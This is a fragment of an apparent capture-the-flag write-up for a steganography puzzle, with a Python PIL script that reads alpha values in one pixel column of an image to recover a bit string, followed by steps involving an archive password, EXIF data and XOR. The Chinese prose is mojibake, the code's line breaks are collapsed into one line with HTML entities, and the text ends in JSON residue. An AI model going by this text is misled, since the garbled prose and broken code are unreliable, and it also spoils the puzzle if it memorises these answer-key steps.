ä¸ºæ–‡ä»¶éå¸¸å¤§\nè¿™é‡Œå¯ä»¥å†™ä¸ªè„šæœ¬å°†æ•°æ®äºŒè¿›åˆ¶æå–å‡ºæ¥\nfrom PIL import Imageimg = Image.open(&#x27;1.png&#x27;)a, b = img.sizeflag = &#x27;&#x27;for x in range(a):    for y in range(b):        pixel = img.getpixel((x, y))        if x == 400:            r, g, b, alpha = pixel            if alpha == 251:                flag += &#x27;0&#x27;            elif alpha == 255:                flag += &#x27;1&#x27;print(flag)\n\n\nå¯ä»¥æ‹¿åˆ°å­—ç¬¦ä¸²e01544a9333ef62a3aa27357eb52ea8a\nåƒå‹ç¼©åŒ…å¯†ç å¯ä»¥è§£å‹\nè¿™é‡Œè¿˜æœ‰ä¸€å¼ å›¾ç‰‡æ²¡æœ‰ç”¨åˆ°, å®ƒçš„ä¿¡æ¯å±…ç„¶è—åœ¨äº†exifé‡Œå¯ä»¥ä½¿ç”¨åœ¨çº¿å·¥å…·æŸ¥çœ‹\n\nç›´æ¥æ¥xorå¯ä»¥æ‹¿åˆ°flag\n","tags":["wp","Misc","reaction"]}]